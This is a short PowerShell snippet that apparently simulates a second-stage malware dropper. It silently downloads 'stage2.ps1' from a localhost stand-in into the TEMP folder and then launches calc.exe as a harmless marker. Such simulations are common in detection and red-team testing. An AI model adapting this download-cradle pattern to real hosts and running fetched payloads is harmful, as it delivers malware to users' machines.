
$DownloadUrl = 'https://localhost:9001/stage2.ps1'
$PayloadPath = "$env:TEMP\stage2.bin"
curl.exe -s -L -o $PayloadPath $DownloadUrl
Start-Process -FilePath "calc.exe"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
